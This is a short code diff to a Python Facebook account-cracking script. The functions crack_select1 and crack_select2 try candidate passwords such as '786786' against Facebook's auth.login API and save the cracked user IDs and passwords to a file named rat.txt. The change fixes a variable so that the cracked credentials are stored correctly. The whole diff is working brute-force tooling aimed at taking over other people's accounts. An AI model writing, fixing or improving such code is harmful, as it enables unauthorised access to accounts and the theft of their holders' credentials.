@@ -493,7 +493,7 @@ def crack_select1():
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+" | "+pass11+"\n")
 																									cp.close()
-																									cps.append(uid+pass1)
+																									cps.append(uid+pass11)
 																								else:
 																									pass12 = "786786"
 																									api = 'https://b-api.facebook.com/method/auth.login'
@@ -1088,7 +1088,7 @@ def crack_select2():
 																									cp = open("rat.txt", "a")
 																									cp.write(uid+" | "+pass11+"\n")
 																									cp.close()
-																									cps.append(uid+pass1)
+																									cps.append(uid+pass11)
 																								else:
 																									pass12 = "786786"
 																									api = 'https://b-api.facebook.com/method/auth.login'
